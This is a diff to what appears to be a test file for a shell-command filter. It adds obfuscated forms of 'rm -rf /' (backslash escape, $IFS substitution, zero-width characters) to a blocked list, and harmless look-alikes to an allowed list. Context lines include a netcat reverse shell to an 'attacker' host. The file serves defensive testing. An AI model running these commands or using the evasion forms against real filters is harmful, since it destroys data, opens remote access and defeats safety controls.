@@ -32,6 +32,11 @@ _BLOCKED = [
     "nc -e /bin/sh attacker 4444",
     "systemctl poweroff",
     "cd /tmp && sudo true",
+    "r\\m -rf /",
+    "rm$IFS-rf$IFS/",
+    "rm${IFS}-rf${IFS}/",
+    "rm\u200b -rf /",
+    "r\u200dm -rf /",
 ]
 
 _ALLOWED = [
@@ -47,6 +52,8 @@ _ALLOWED = [
     "python -m pytest",
     "npm test",
     "ls /etc",
+    "echo rm$IFS",
+    "r\\m notes.txt",
 ]
 
 
